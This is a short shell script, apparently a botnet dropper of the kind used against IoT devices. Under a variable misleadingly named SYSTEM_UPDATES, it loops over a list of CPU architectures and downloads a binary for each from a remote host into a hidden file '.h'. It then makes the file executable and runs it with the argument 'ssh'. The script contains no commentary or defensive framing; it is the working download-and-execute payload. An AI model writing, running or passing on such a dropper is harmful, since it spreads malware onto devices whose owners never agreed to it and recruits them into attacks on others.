SYSTEM_UPDATES="arm arm5 arm6 arm7 mips mipsel x86 x86_64 powerpc"
for update in $SYSTEM_UPDATES
do
    cd here
    chmod 777 .h || chmod +x .h
    wget http://dns.cyberium.cc/$update -O -> .h
    chmod 777 .h || chmod +x .h
    ./.h ssh
done